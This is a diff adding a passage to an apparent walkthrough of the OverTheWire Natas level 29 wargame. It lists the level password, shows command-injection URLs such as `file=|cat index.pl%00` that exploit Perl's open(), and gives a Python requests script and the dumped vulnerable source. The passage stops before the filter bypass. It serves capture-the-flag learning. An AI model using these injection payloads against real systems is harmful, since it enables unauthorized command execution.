@@ -4990,3 +4990,175 @@ Which, inserted after `query=` in the URL, gives us:
 > 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
 
 Therefore: `natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`.
+
+
+## Natas 29
+
+### Credentials
+
+Username: natas29
+
+Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+
+URL: http://natas29.natas.labs.overthewire.org
+
+### Message
+
+> H3y K1dZ,
+> 
+> y0 rEm3mB3rz p3Rl rit3?
+> 
+> \/\/4Nn4 g0 olD5kewL? R3aD Up!
+> 
+> c4n Y0 h4z s4uc3?
+
+There is a **Perl underground** section.
+
+### Solution
+
+Selecting `perl underground` in the **Perl underground** area results in a call to:
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground
+```
+
+We can inject commands that must be terminated by `%00`:
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
+```
+
+We try to read `index.pl`:
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00
+```
+
+Using the script:
+```python
+import requests
+import urllib
+import string
+import os
+import base64
+
+from utils import utils
+
+
+basic_auth = ('natas29', '31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns')
+
+url = "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+letters = string.ascii_letters
+
+prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
+suffix = "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="
+
+def send_request(session) -> str:
+    response = session.get(url,
+                    headers=headers)
+    return response.text
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    res = send_request(session)
+    print(res)
+```
+we print the HTML response, which contains Perl code:
+```perl
+#!/usr/bin/perl
+use CGI qw(:standard);
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<style>
+
+#content {
+    width: 1000px;
+}
+pre{
+    background-color: #000000;
+    color: #00FF00;
+}
+
+</style>
+
+<h1>natas29</h1>
+<div id="content">
+END
+#
+# morla /10111
+# '$_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
+#
+# credits for the previous level go to whoever
+# created insomnihack2016/fridginator, where i stole the idea from.
+# that was a fun challenge, Thanks!
+#
+
+print <<END;
+H3y K1dZ,<br>
+y0 rEm3mB3rz p3Rl rit3?<br>
+\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>
+
+<form action="index.pl" method="GET">
+<select name="file" onchange="this.form.submit()">
+  <option value="">s3lEcT suMp1n!</option>
+  <option value="perl underground">perl underground</option>
+  <option value="perl underground 2">perl underground 2</option>
+  <option value="perl underground 3">perl underground 3</option>
+  <option value="perl underground 4">perl underground 4</option>
+  <option value="perl underground 5">perl underground 5</option>
+</select>
+</form>
+
+END
+
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+
+print <<END;
+```
+
+Interesting check on the file:
+```perl
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+```
+
+How can we bypass it?
